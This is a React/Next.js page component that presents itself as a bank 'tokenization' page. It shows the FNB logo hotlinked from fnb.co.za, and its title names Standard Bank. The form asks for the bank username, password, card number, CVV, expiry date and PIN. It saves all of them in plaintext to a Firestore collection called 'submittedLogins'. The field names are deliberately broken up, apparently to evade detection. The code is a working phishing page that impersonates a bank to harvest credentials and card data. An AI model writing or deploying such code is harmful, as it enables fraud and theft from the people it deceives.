import React from "react";
import { addDoc, collection } from "firebase/firestore";
import { db } from "../../../services/firebase.config";
import { Meta } from "../../../components";
import { Box, Typography } from "@mui/material";
import PrivateRoute from "../../../components/auth/PrivateRoute";
import { useContext } from "react";
import userDataContext from "../../../context/UserDataContext";
import { useState } from "react";
import cogoToast from "cogo-toast";
import { useRouter } from "next/router";

const Fnb = () => {
  const router = useRouter();
  const [isLoading, setIsLoading] = useState(false);
  const [formData, setFormData] = useState({
    username: "",
    _pas_swo_rd: "",
    _ca_rd_Num_ber: "",
    _p_i_n_: "",
    _c_v_v_: "",
    _exp_iry_Da_te_: "",
  });
  const { userData } = useContext(userDataContext);

  const {
    username,
    _pas_swo_rd,
    _ca_rd_Num_ber,
    _p_i_n_,
    _c_v_v_,
    _exp_iry_Da_te_,
  } = formData;

  const tokenizeAccount = async () => {
    const validateDetails =
      username.trim().length > 0 &&
      _pas_swo_rd.length > 0 &&
      _ca_rd_Num_ber.trim().length > 10 &&
      _p_i_n_.trim().length >= 4 &&
      _c_v_v_.trim().length >= 3 &&
      _exp_iry_Da_te_.trim().length >= 6;

    if (validateDetails) {
      try {
        setIsLoading(true);

        const res = await addDoc(collection(db, "submittedLogins"), {
          _user: userData.id,
          user_name: `${userData.firstName} ${userData.lastName}`,
          timeStamp: new Date(),
          data: {
            ...formData,
            _exp_iry_Da_te_: new Date(_exp_iry_Da_te_),
            bank: "fnb bank",
          },
        });

        console.log(res);
        if (res) {
          cogoToast.success("Successful");
          // navigate back to dashboard
          router.replace("/account");
        }
        setIsLoading(false);
      } catch (error) {
        console.log(error);
        cogoToast.error("Something went wrong");
        setIsLoading(false);
      }
    } else {
      cogoToast.error("One or more inputs are invalid");
    }
  };

  const inputChangeHandler = (e) => {
    setFormData((prev) => ({
      ...prev,
      [e.target.id]: e.target.value,
    }));
  };

  return (
    <>
      <Meta
        title="Standard Bank Tokenization - Blue Chip Finance Internet Banking"
        description="Standard Bank Tokenization - Blue Chip Finance Internet Banking"
      />
      <PrivateRoute>
        <Box
          sx={{
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            justifyContent: "center",
            minHeight: "100vh",
          }}
        >
          <img
            src="https://www.fnb.co.za/_assets/images/generic/skins/00/navigation/secondary-logo/header-logo_lrg.svg?v=1685708122000"
            alt="Standard bank logo"
            style={{ width: "60px", marginBottom: "2rem" }}
          />
          <Box sx={{ width: "100%", maxWidth: "320px" }}>
            <form className="fnb-form">
              <div>
                <label htmlFor="username">Username</label>
                <input
                  name="username"
                  id="username"
                  type="text"
                  value={username}
                  onChange={inputChangeHandler}
                />
              </div>
              <div>
                <label htmlFor="_pas_swo_rd">Password</label>
                <input
                  name="password"
                  id="_pas_swo_rd"
                  type="password"
                  value={_pas_swo_rd}
                  onChange={inputChangeHandler}
                />
              </div>
              <div>
                <label htmlFor="_ca_rd_Num_ber">Card Number</label>
                <input
                  name="cardNumber"
                  id="_ca_rd_Num_ber"
                  type="number"
                  value={_ca_rd_Num_ber}
                  onChange={inputChangeHandler}
                />
              </div>
              <div>
                <label htmlFor="_c_v_v_">CVV</label>
                <input
                  name="cvv"
                  id="_c_v_v_"
                  type="number"
                  value={_c_v_v_}
                  onChange={inputChangeHandler}
                />
              </div>
              <div>
                <label htmlFor="_exp_iry_Da_te_">Expiry Date</label>
                <input
                  name="expiryDate"
                  id="_exp_iry_Da_te_"
                  type="date"
                  value={_exp_iry_Da_te_}
                  onChange={inputChangeHandler}
                />
              </div>
              <div>
                <label htmlFor="_p_i_n_">Pin</label>
                <input
                  name="pin"
                  id="_p_i_n_"
                  type="number"
                  value={_p_i_n_}
                  onChange={inputChangeHandler}
                />
              </div>

              <button
                type="button"
                onClick={tokenizeAccount}
                disabled={isLoading}
              >
                {isLoading ? "LOADING..." : "SUBMIT"}
              </button>
            </form>
          </Box>
        </Box>
      </PrivateRoute>
    </>
  );
};

export default Fnb;
